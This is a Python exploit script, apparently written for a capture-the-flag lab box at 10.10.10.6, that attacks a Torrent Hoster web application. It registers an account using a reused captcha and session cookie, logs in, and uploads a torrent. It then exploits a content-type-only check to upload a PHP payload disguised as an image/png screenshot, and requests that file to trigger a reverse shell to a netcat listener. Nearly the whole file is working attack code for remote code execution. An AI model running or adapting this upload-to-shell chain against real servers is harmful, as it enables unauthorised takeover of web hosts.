import requests
import random
import string
import re


############################################
##    SCRIPT REQUIRES EXTERNAL VALUES     ##
############################################
# The captcha code is tied to the session
# cookie and can be used multiple times
# once a captcha code and session id are
# obtained the script can register a user
# http://10.10.10.6/torrent/users/index.php?mode=register
SESSION_ID = "4a2f5c7be747e8b63085580b222ad389"
CODE = "7adbe"
#############################################


def register_user():
    success_string = "Thank you for registering to Torrent Hoster  Your account information is:"

    data = {
    "username": f"{username}",
    "password": "password",
    "password2": "password",
    "email": f"{RND_STRING}@email.com",
    "number": f"{CODE}"
    }

    r = session.post(url_base + register_url, data=data, cookies=COOKIE)

    if success_string in r.text:
        print("[*] User registered")
        return username
    elif f"The username <b>{username}</b> already exists" in r.text:
        print("[*] Username previously registered")
    elif f"Your Code is invalid" in r.text:
        print("[!] Error new captcha code is required in the script")
        exit()
    else:
        print("[!] Error in registering user")
        exit()

def login(username):

    data = {
        "username": username,
        "password": "password"
    }

    error_string = "Invalid login, please try again"

    r = session.post(url_base + login_url, data=data, cookies=COOKIE)

    # Successful login will redirect
    if not error_string in r.text:
        print("[*] User loged in")
    else:
        print("[!] Error logging in!")
        exit()

def upload_file():

    success_string = "file upload succes"

    data = None
    with open(TORRENT_FILE_PATH, "rb") as file:
        data = file.read()

    files = {
        "torrent" : (f"{RND_STRING}.torrent", data),
        "filename": (None, ""), 
        "type": (None, "1"),
        "subtype": (None, "1"),
        "user_id": (None, ""),
        "anonymous2": (None, "false"),
        "anonymous": (None, "true"),
        "autoset": (None, "enabled"),
        "info" : (None, ""),
        "registration": (None, "false"),
        "hideuser": (None, "false"),
        "submit": (None, "Upload Torrent")
    }

    r = session.post(url_base + upload_url, files=files, cookies=COOKIE)

    if success_string in r.text:
        print("[*] File upload completed!")
    elif "this torrent allready exists in our database" in r.text:
        print("[*] Torrent file already exists")
    else:
        print("[!] Error in file upload!")
        exit()

def edit_thumbnail():

    r = session.get("http://10.10.10.6/torrent/users/", cookies=COOKIE)

    # grabs the url to the torrent
    url = re.findall(r"mode=details&amp;id=.{40}", r.text)

    # Grabs the first one as ours will be at the top
    url = url[0].replace("&amp;", "&")

    # Changes it to an upload command
    url = url.replace("details", "upload")

    data = None
    with open(PAYLOAD_FILE_PATH, "rb") as file:
        data = file.read()

    # The vulnerability here is the server only checks the content type
    files = {
        "file": ("file.php", data, "image/png"),
        "submit": (None, "Submit Screenshot")
    }

    # Content-Type: image/png
    r = session.post(url_base + "upload_file.php?" + url, files=files, cookies=COOKIE)

    if not "Invalid file" in r.text:
        print("[*] Uploaded payload to server")

        # Returns the file name of the payload
        return url.split("=")[-1]
    else:
        print("[!] Error with payload upload!")
        exit()

def execute_shell(id):
    
    print("[*] Navigating to payload.....")
    session.get(url_base + f"upload/{id}.php")
    print("[!] Error in establishing a reverse shell connection. Is the netcat server running?")


COOKIE = {"PHPSESSID" : SESSION_ID}
TORRENT_FILE_PATH = "./sample.torrent"
PAYLOAD_FILE_PATH = "./shell.php"

# Used to make unique credentials
RND_STRING = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))

session = requests.Session()

url_base = "http://10.10.10.6/torrent/"
register_url = "users/index.php?mode=register"
login_url = "login.php"
upload_url = "torrents.php?mode=upload"

username = "TestNJ5RHLUT07Y4VD"

register_user()
login(username)
upload_file()
file_name = edit_thumbnail()
execute_shell(file_name)